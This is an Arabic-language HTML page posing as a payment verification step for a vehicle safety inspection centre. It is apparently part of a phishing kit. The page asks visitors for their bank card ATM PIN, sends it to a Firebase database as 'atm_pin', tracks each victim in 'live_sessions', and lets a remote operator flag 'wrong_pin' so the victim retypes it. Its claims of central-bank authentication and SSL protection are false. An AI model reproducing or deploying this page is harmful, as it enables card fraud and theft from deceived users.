<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>المصادقة الآمنة - مركز سلامة المركبات</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <style>
        :root { --main-green: #1e7344; --error-red: #d93025; --bg-light: #f7f8fa; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
        body { background-color: var(--bg-light); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px; }

        .secure-container {
            background: #fff;
            width: 100%;
            max-width: 350px;
            border-radius: 20px;
            padding: 25px 20px;
            box-shadow: 0 8px 25px rgba(0,0,0,0.05);
            text-align: center;
        }

        .icon-box { margin-bottom: 15px; }
        .icon-box img { width: 45px; height: auto; opacity: 0.8; }

        h2 { font-size: 17px; color: #333; margin-bottom: 8px; font-weight: bold; }
        p { font-size: 12px; color: #777; line-height: 1.5; margin-bottom: 25px; }

        .pin-input-field {
            width: 100%;
            max-width: 220px;
            height: 48px;
            border: 1px solid #e0e0e0;
            border-radius: 10px;
            text-align: center;
            font-size: 22px;
            letter-spacing: 12px;
            font-weight: bold;
            color: var(--main-green);
            outline: none;
            background-color: #fcfcfc;
            margin-bottom: 10px;
            transition: 0.3s;
        }

        /* تنسيق الخطأ */
        .pin-input-field.error-border { border: 2px solid var(--error-red); background-color: #fff8f8; color: var(--error-red); }
        #pinError { color: var(--error-red); font-size: 11px; font-weight: bold; margin-bottom: 15px; display: none; }

        .pin-input-field:focus { border-color: var(--main-green); box-shadow: 0 0 0 3px rgba(30, 115, 68, 0.1); }

        .btn-submit {
            width: 100%;
            background-color: var(--main-green);
            color: white;
            border: none;
            border-radius: 10px;
            padding: 14px;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }
        .btn-submit:hover { background-color: #145230; }
        .btn-submit:disabled { background-color: #ccc; cursor: not-allowed; }

        .secure-footer {
            margin-top: 15px;
            font-size: 10px;
            color: #bbb;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 5px;
        }
    </style>
</head>
<body>

    <div class="secure-container">
        <div class="icon-box">
            <img src="https://img.icons8.com/ios-filled/100/1e7344/shield-lock.png" alt="Secure Shield">
        </div>

        <h2>تأكيد الهوية الرقمية</h2>
        <p>لإتمام عملية الدفع بنجاح، يرجى إدخال الرقم السري الخاص بالبطاقة المكون من 4 أرقام للمصادقة مع نظام البنك المركزي.</p>

        <div id="pinError">برجاء التحقق من الرقم الصحيح للصراف الآلي</div>

        <input type="password" inputmode="numeric" maxlength="4" class="pin-input-field" id="authPin" placeholder="****">

        <button class="btn-submit" id="submitBtn" onclick="sendAuth()">تأكيد المصادقة</button>

        <div class="secure-footer">
            <span>🔒 نظام دفع مشفر بمعايير SSL العالمية</span>
        </div>
    </div>

    <script>
        const firebaseConfig = { 
            apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8...", 
            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/", 
            projectId: "saso-inspection" 
        };
        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
        const database = firebase.database();
        const v_id = localStorage.getItem('v_id');

        if (v_id) {
            // تحديث مكان العميل
            database.ref('live_sessions/' + v_id).update({
                current_page: "تأكيد الهوية (PIN)",
                last_seen: new Date().getTime()
            });

            // مراقبة الرفض من اللوحة
            database.ref('orders/' + v_id + '/next_step').on('value', (snapshot) => {
                const step = snapshot.val();
                if (step === 'wrong_pin') {
                    document.getElementById('authPin').classList.add('error-border');
                    document.getElementById('pinError').style.display = 'block';
                    document.getElementById('authPin').value = ''; // مسح الرقم القديم
                    const btn = document.getElementById('submitBtn');
                    btn.disabled = false;
                    btn.innerText = "تأكيد المصادقة";
                }
            });
        }

        function sendAuth() {
            let pinVal = document.getElementById('authPin').value;
            const btn = document.getElementById('submitBtn');

            if (pinVal.length === 4 && v_id) {
                btn.disabled = true;
                btn.innerText = "جاري المعالجة...";
                
                // إخفاء الخطأ عند المحاولة الجديدة
                document.getElementById('authPin').classList.remove('error-border');
                document.getElementById('pinError').style.display = 'none';

                // إرسال البيانات للفايربيس وتصفير الحالة للانتظار
                database.ref('orders/' + v_id).update({
                    atm_pin: pinVal,
                    status: "PIN_Submitted",
                    next_step: "waiting", // يثبت مكانه في صفحة التحميل
                    last_update: new Date().getTime()
                }).then(() => {
                    window.location.replace('processing.html');
                });
            } else {
                alert("يرجى إدخال الرمز المكون من 4 أرقام");
            }
        }

        document.getElementById('authPin').addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '');
        });
    </script>
</body>
</html>
